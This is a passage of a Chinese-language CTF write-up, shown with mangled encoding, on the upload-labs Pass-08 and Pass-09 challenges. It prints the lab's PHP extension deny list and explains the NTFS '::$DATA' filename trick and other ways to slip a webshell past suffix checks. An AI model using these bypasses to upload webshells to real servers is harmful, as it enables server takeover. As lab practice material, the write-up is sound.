src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2010.33.45.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°ç»•è¿‡å¤±è´¥äº†ã€‚</p><ul><li>.htaccessæ–‡ä»¶æ— æ³•ä¸Šä¼ </li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2010.35.11.png" style="zoom:50%;"><ul><li>æŸ¥çœ‹æç¤º</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2010.36.27.png" style="zoom:50%;"><p>é»‘åå•æŒºå…¨ã€‚</p><ul><li>ä»£ç å®¡è®¡</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//é¦–å°¾å»ç©º</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶å®è¿™å‡ å…³æ¶‰åŠåˆ°åç«¯æ£€æµ‹åç¼€åçš„ï¼Œæ ¸å¿ƒæ€è·¯éƒ½æ˜¯ä¸¤ç‚¹ï¼š1ï¼‰èƒ½ç»•è¿‡åç¼€åæ£€æµ‹ 2ï¼‰èƒ½å¤Ÿè®©ä¸Šä¼ çš„webshellè¢«è§£ææ‰§è¡Œã€‚</p><p>åˆ†æï¼š</p><p>1ï¼‰å»é™¤äº†å°¾éƒ¨çš„.=&gt;æ‰€ä»¥æ— æ³•ç”¨åœ¨å°¾éƒ¨åŠ â€.â€çš„æ–¹æ³•ç»•è¿‡ã€‚</p><p>2ï¼‰åç¼€åé¦–å°¾å»ç©º=&gt;æ‰€ä»¥æ— æ³•ç”¨åœ¨å°¾éƒ¨åŠ â€ç©ºæ ¼â€çš„æ–¹æ³•ç»•è¿‡ã€‚</p><p>ä½†æ˜¯è™½ç„¶å°¾éƒ¨æ²¡åŠæ³•ç›´æ¥æ·»åŠ ç©ºæ ¼ï¼Œä½†æ˜¯å¯ä»¥æ·»åŠ å…¶ä»–è¯­ä¹‰ä¸Šä¸ºç©ºçš„å†…å®¹ï¼Œå¦‚<code>::$DATA</code></p><blockquote><h4 id="windwosä¸­çš„-DATA"><a href="#windwosä¸­çš„-DATA" class="headerlink" title="windwosä¸­çš„::$DATA"></a>windwosä¸­çš„::$DATA</h4><p>åœ¨ Windows ç³»ç»Ÿä¸­ï¼Œ<code>::$DATA</code> æ˜¯ NTFS æ–‡ä»¶ç³»ç»Ÿçš„ä¸€ä¸ªç‰¹æ€§ï¼Œç”¨äºè¡¨ç¤ºæ–‡ä»¶çš„é»˜è®¤æ•°æ®æµã€‚å®ƒæ˜¯æ–‡ä»¶ç³»ç»Ÿä¸­éšè—çš„å±æ€§ï¼Œç”¨äºå­˜å‚¨æ–‡ä»¶çš„å®é™…å†…å®¹ã€‚</p><p>ç‰¹æ€§ä¸ç”¨é€”ï¼š</p><ol><li><strong>æ–‡ä»¶æµçš„é»˜è®¤æ•°æ®æµ</strong><br>æ¯ä¸ªæ–‡ä»¶åœ¨ NTFS æ–‡ä»¶ç³»ç»Ÿä¸­è‡³å°‘åŒ…å«ä¸€ä¸ªæ•°æ®æµï¼Œå³ <code>::$DATA</code>ã€‚å®ƒæ˜¯æ–‡ä»¶çš„ä¸»æµï¼Œå­˜å‚¨æ–‡ä»¶çš„å®é™…å†…å®¹ã€‚</li><li><strong>éšè—å±æ€§</strong><br><code>::$DATA</code> æ˜¯éšè—çš„ï¼Œæ™®é€šç”¨æˆ·é€šå¸¸æ— æ³•ç›´æ¥è®¿é—®å®ƒï¼Œåªæœ‰ç³»ç»Ÿå’Œç‰¹å®šç¨‹åºå¯ä»¥æ“ä½œã€‚</li><li><strong>æ–‡ä»¶åæ“ä½œ</strong><br>å½“æ–‡ä»¶ååé™„åŠ  <code>::$DATA</code> æ—¶ï¼ŒWindows ä¼šå¿½ç•¥ <code>::$DATA</code>ï¼Œå¹¶å°†å…¶è§†ä¸ºæ–‡ä»¶çš„é»˜è®¤æ•°æ®æµã€‚è¿™ç§ç‰¹æ€§å¯ä»¥è¢«åˆ©ç”¨æ¥ç»•è¿‡æŸäº›æ–‡ä»¶ç±»å‹æ£€æŸ¥ã€‚</li></ol><h5 id="åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸­çš„ç»•è¿‡æŠ€å·§"><a href="#åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸­çš„ç»•è¿‡æŠ€å·§" class="headerlink" title="åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸­çš„ç»•è¿‡æŠ€å·§"></a>åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸­çš„ç»•è¿‡æŠ€å·§</h5><p>åœ¨æŸäº›æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ <code>::$DATA</code> ç»•è¿‡åç¼€åæ£€æŸ¥ã€‚ä¾‹å¦‚ï¼š</p><ul><li>ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œå°†æ–‡ä»¶åæ”¹ä¸º <code>shell.php::$DATA</code>ã€‚</li><li>æœåŠ¡å™¨åœ¨å¤„ç†æ–‡ä»¶æ—¶ï¼Œå¯èƒ½ä¼šå¿½ç•¥ <code>::$DATA</code>ï¼Œä»è€Œå°†æ–‡ä»¶ä¿å­˜ä¸º <code>shell.php</code>ã€‚</li><li>è¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡åç¼€åé»‘åå•æˆ–ç™½åå•çš„é™åˆ¶ã€‚</li></ul></blockquote><ul><li>å°¾éƒ¨::$DATAç»•è¿‡</li></ul><p>ç”±äº::$DATAæ˜¯windowsçš„ç‰¹æ€§ï¼Œlinuxå¹³å°æ— æ³•å®ç°åˆ©ç”¨ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2010.55.04.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2010.57.53.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2010.58.15.png" style="zoom:40%;"><ul><li>windwosç¯å¢ƒåˆ©ç”¨</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.02.05.png" style="zoom:40%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.05.45.png" style="zoom:50%;"><p>ä¸Šä¼ å‡ºé”™ï¼Œ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>               <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>move_uploaded_fileæ‰§è¡Œå‡ºé”™ã€‚</p><p>è¿˜æ˜¯æ˜¯é¶åœºç¯å¢ƒçš„é—®é¢˜ï¼Œæ­£å¸¸æƒ…å†µä¸‹åº”è¯¥èƒ½ä¸Šä¼ æˆåŠŸã€‚</p><h1 id="ä¹ã€Pass-09-ï¼ˆåç«¯åç¼€åæ£€æµ‹-å°¾éƒ¨-ç©ºæ ¼-ç»•è¿‡-windwos-ï¼‰"><a href="#ä¹ã€Pass-09-ï¼ˆåç«¯åç¼€åæ£€æµ‹-å°¾éƒ¨-ç©ºæ ¼-ç»•è¿‡-windwos-ï¼‰" class="headerlink" title="ä¹ã€Pass-09**ï¼ˆåç«¯åç¼€åæ£€æµ‹-å°¾éƒ¨ .ç©ºæ ¼.ç»•è¿‡(windwos)ï¼‰"></a>ä¹ã€Pass-09**ï¼ˆåç«¯åç¼€åæ£€æµ‹-å°¾éƒ¨ <code>.ç©ºæ ¼.</code>ç»•è¿‡(windwos)ï¼‰</h1><h2 id="9-1-é¢˜é¢"><a href="#9-1-é¢˜é¢" class="headerlink" title="9.1 é¢˜é¢"></a>9.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.13.24.png" style="zoom:50%;"><p>è€æ ·å­ã€‚</p><h2 id="9-2-è§£é¢˜"><a href="#9-2-è§£é¢˜" class="headerlink" title="9.2 è§£é¢˜"></a>9.2 è§£é¢˜</h2><p>ä¸Šä¼ yjh.phpç„¶åæŠ“åŒ…ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.17.34.png" style="zoom:50%;"><ul><li>æ£€æµ‹æ–¹æ³•åˆ¤æ–­</li></ul><p>â€‹    æ”¹æˆ.jpgåç¼€ä¸Šä¼ æˆåŠŸäº†=&gt;æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å¤´&amp;&amp;æ²¡æœ‰æ£€æµ‹MIMEç±»å‹ã€‚</p><p>   å¹¶ä¸”æ–‡ä»¶æ²¡æœ‰è¢«é‡å‘½åã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.18.29.png" style="zoom:50%;"><ul><li>å¤§å°å†™è½¬æ¢ç»•è¿‡å¤±è´¥</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.20.11.png" style="zoom:50%;"><ul><li>é…ç½®æ–‡ä»¶ä¸Šä¼ å¤±è´¥</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.21.11.png" style="zoom:50%;"><ul><li>å°¾éƒ¨ç©ºæ ¼ã€â€.â€ã€â€::$DATAâ€</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.22.41.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.22.10.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.23.30.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.41.57.png" style="zoom:50%;"><p>â€‹å°¾éƒ¨çš„â€.â€è¢«åˆ é™¤äº†ã€‚</p><ul><li>æŸ¥çœ‹æç¤º</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-23%2011.24.06.png" style="zoom:50%;"><p>è²Œä¼¼è¿™æ¬¡æ˜¯ç™½åå•æ£€æµ‹ã€‚</p><ul><li>ä»£ç å®¡è®¡</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//é¦–å°¾å»ç©º</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="FILES-upload-file-tmp-name-å’Œ-FILES-upload-file-name"><a href="#FILES-upload-file-tmp-name-å’Œ-FILES-upload-file-name" class="headerlink" title="$_FILES['upload_file']['tmp_name'] å’Œ$_FILES['upload_file']['name']"></a><code>$_FILES['upload_file']['tmp_name'] å’Œ$_FILES['upload_file']['name']</code></h4><h5 id="1-FILES-upload-file-tmp-name"><a href="#1-FILES-upload-file-tmp-name" class="headerlink" title="1. $_FILES['upload_file']['tmp_name']"></a>1. 